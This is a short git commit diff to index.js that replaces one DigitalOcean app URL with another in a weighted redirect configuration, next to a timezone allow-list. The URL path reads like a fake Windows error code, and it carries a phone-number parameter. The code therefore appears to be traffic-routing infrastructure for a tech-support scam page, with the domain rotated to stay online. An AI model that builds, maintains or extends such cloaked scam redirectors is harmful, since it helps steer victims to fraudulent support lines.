59a9576a4f21f930ec78dd273f000cc559df1104
paalakash <palaksh452@gmail.com>
2026-06-17 12:33:15 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-grey-app-cxn4f.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-302-600-9823", weight: 1.0 }
+    { url: "https://seashell-app-a8xlg.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-302-600-9823", weight: 1.0 }
 
 ];
 
